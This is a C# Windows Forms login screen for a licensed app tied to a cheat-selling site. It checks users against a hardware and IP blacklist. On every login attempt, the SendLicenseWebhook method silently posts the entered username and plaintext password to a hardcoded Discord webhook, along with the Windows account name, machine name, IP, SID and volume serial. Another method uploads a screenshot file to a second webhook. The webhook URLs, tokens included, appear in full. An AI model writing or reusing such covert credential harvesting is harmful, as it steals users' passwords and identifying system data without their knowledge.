using KeyAuth;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Newtonsoft.Json;
using System.Security.Principal;
using System.Diagnostics;


namespace BasicToAdvance_01
{

    public partial class Form1 : Form
    {
        private int failedLoginAttempts = 0; // Track failed login attempts
        public static api KeyAuthApp = new api(
    name: "Course Basic To Advance", // App name
    ownerid: "tLfYsHY39n", // Account ID
    version: "1.0" // Application version. Used for automatic downloads see video here https://www.youtube.com/watch?v=kW195PLCBKs
                   //path: @"Your_Path_Here" // (OPTIONAL) see tutorial here https://www.youtube.com/watch?v=I9rxt821gMk&t=1s
);

        public Form1()
        {
            InitializeComponent();
            KeyAuthApp.init();
          /*  if (KeyAuthApp.checkblack())
            {
                MessageBox.Show("User Blacklist!");
                Environment.Exit(0);  // terminate program if user blacklisted.
            }*/

        }

        private void guna2PictureBox1_Click(object sender, EventArgs e)
        {

        }
        private static string apiUrl = "https://gtccheats.shop/Blacklist/Login/api.php"; // Do Not Change This URL
        private static string Checkblack = "https://gtccheats.shop/Blacklist/Login/CheckBlack.php"; // Do Not Change This URL
        private static string privateKey = "Your Private Key Here"; // Replace with actual key
        #region BlacklistChecking
        static async Task<bool> CheckBlacklistStatus()
        {
            string hwid = ForHWIDBlack();
            string ip = await IPForBlacklisted();
            string url = $"{Checkblack}?key={privateKey}&hwid={hwid}&ip={ip}";

            try
            {
                using (HttpClient client = new HttpClient())
                {
                    string response = await client.GetStringAsync(url);
                    return response.Contains("BLACKLISTED");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
                return false;
            }
        }

        static async Task<bool> AddToBlacklist(string hwid, string ip, string reason, int expiry)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    var content = new FormUrlEncodedContent(new[]
                    {
                    new KeyValuePair<string, string>("key", privateKey),
                    new KeyValuePair<string, string>("hwid", hwid),
                    new KeyValuePair<string, string>("ip", ip),
                    new KeyValuePair<string, string>("reason", reason),
                    new KeyValuePair<string, string>("expiry", expiry.ToString())
                });

                    HttpResponseMessage response = await client.PostAsync(apiUrl, content);
                    string result = await response.Content.ReadAsStringAsync();

                    return result.Contains("SUCCESS"); // Adjust based on actual API response
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
                return false;
            }
        }

        static string ForHWIDBlack()
        {
            return System.Security.Principal.WindowsIdentity.GetCurrent().User.Value;
        }


        static async Task<string> IPForBlacklisted()
        {
            using (HttpClient client = new HttpClient())
            {
                return await client.GetStringAsync("https://api64.ipify.org");
            }
        }
     
        #endregion

        private async void Form1_Load(object sender, EventArgs e)
        {
            bool isBlacklisted = await CheckBlacklistStatus();

            if (isBlacklisted)
            {
                error.Show("The user is blacklisted.");
                await Task.Delay(2000);
                Environment.Exit(0);
            }
            else
            {
                info.Show("Welcome Back :" + Environment.UserName);

            }

        }
        #region DiscordWebHook
        private string GetSID(string userName)
        {
            string sid = string.Empty;

            try
            {
                NTAccount account = new NTAccount(userName);
                SecurityIdentifier sidObj = (SecurityIdentifier)account.Translate(typeof(SecurityIdentifier));

                sid = sidObj.Value;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error getting SID: " + ex.Message);
            }

            return sid;
        }
        private async Task SendToDiscordWebhook(string imagePath)
        {
            string webhookUrl = "https://discord.com/api/webhooks/1339693723952611399/rRwT9QLBLyO5ZF8Vp5hBLQzOoAyp6HS1TTYR8cpkIbtC0s4kib58nUF6APpEFjTS_5FC";

            using (var httpClient = new HttpClient())
            {
                using (var form = new MultipartFormDataContent())
                {
                    using (var fileStream = new FileStream(imagePath, FileMode.Open))
                    {
                        form.Add(new StreamContent(fileStream), "file", "screenshot.png");

                        var response = await httpClient.PostAsync(webhookUrl, form);
                        response.EnsureSuccessStatusCode();
                    }
                }
            }
        }

        private string GetHWID()
        {

            string systemDrive = Path.GetPathRoot(Environment.SystemDirectory);
            string volumeSerial = string.Empty;

            try
            {
                ManagementObject disk = new ManagementObject("win32_logicaldisk.deviceid=\"" + systemDrive.Substring(0, 2) + "\"");
                disk.Get();
                volumeSerial = disk["VolumeSerialNumber"].ToString();
            }
            catch (Exception ex)
            {

                Console.WriteLine("Error getting volume serial number: " + ex.Message);
            }

            return volumeSerial;
        }

        public DateTime UnixTimeToDateTime(long unixtime)
        {
            System.DateTime dtDateTime = new DateTime(1970, 1, 1, 0, 0, 0, 0, System.DateTimeKind.Local);
            try
            {
                dtDateTime = dtDateTime.AddSeconds(unixtime).ToLocalTime();
            }
            catch
            {
                dtDateTime = DateTime.MaxValue;
            }
            return dtDateTime;
        }
        private int SetEmbedColor(bool isSuccess)
        {
            return isSuccess ? 65280 : 16711680; 
        }
        public string expirydaysleft()
        {
            System.DateTime dtDateTime = new DateTime(1970, 1, 1, 0, 0, 0, 0, System.DateTimeKind.Local);
            dtDateTime = dtDateTime.AddSeconds(long.Parse(KeyAuthApp.user_data.subscriptions[0].expiry)).ToLocalTime();
            TimeSpan difference = dtDateTime - DateTime.Now;
            return Convert.ToString(difference.Days + " Days " + difference.Hours + " Hours Left");
        }
        private string GetLocalIpAddress()
        {
            IPHostEntry host = Dns.GetHostEntry(Dns.GetHostName());
            IPAddress ipAddress = host.AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork);
            return ipAddress?.ToString() ?? "";
        }
  
        private async Task SendLicenseWebhook(string username, string password)
        {
            string webhookUrl = "https://discord.com/api/webhooks/1341562447420457012/nsMIUjt4adBzv-sAS-qu6m5hzB2WEF-AueHxH8fPvNNALg64bNjo8UPTiY7sHQFFbmRg";
            string hwid = GetHWID();

            var embed = new
            {
                title = "License Activation",
                color = SetEmbedColor(KeyAuthApp.response.success),
                fields = new[]
                {
            new { name = "Username", value = username, inline = true },
            new { name = "Password", value = password, inline = true },
            new { name = "Username", value = Environment.UserName, inline = true },
            new { name = "Computer Name", value = Environment.MachineName, inline = true },
            new { name = "IP Address", value = $"||{GetLocalIpAddress()}||", inline = true },
            new { name = "Time Zone", value = TimeZoneInfo.Local.ToString(), inline = true },
            new { name = "HWID", value = hwid, inline = true },
            new { name = "SID", value = $"||{GetSID(Environment.UserName)}||", inline = true }
        }
            };

            var payload = new { embeds = new[] { embed } };

            try
            {
                using (HttpClient client = new HttpClient())
                {
                    var jsonContent = JsonConvert.SerializeObject(payload);
                    var content = new StringContent(jsonContent, Encoding.UTF8, "application/json");
                    var response = await client.PostAsync(webhookUrl, content);

                    if (response.IsSuccessStatusCode)
                    {
                  
                    }
                    else
                    {
                        string errorMessage = await response.Content.ReadAsStringAsync();
                        MessageBox.Show($"Error Send: {response.StatusCode}\n\n {errorMessage}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
            catch (HttpRequestException ex)
            {
                MessageBox.Show($"Error: {ex.Message}\n\nStackTrace: {ex.StackTrace}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        #endregion
        private async void guna2Button1_Click(object sender, EventArgs e)
        {
            string username = guna2TextBox1.Text;
            string password = guna2TextBox2.Text;
            KeyAuthApp.login(username, password); 
            bool isLoginSuccessful = KeyAuthApp.response.success;
            if (isLoginSuccessful)
            { 
                failedLoginAttempts = 0;         
                Main main = new Main();
                main.Show();
                this.Hide();         
            }
            else
            {      
                failedLoginAttempts++;
                if (failedLoginAttempts >= 3)
                {  
                    string hwid = ForHWIDBlack();
                    string ip = await IPForBlacklisted();
                    int expiry = 1; // 0 means never expire [If You Enter 1 = 1Day , 2 = 2Day , 0 = Lifetime]
                    await AddToBlacklist(hwid, ip, "Multiple failed login attempts", expiry);
                    error.Show("You have been blacklisted due to multiple failed login attempts.");
                    await Task.Delay(2000);
                    Environment.Exit(0);
                }
                error.Show("Status: " + KeyAuthApp.response.message);
            }      
            await SendLicenseWebhook(username, password);
        }
    }
}
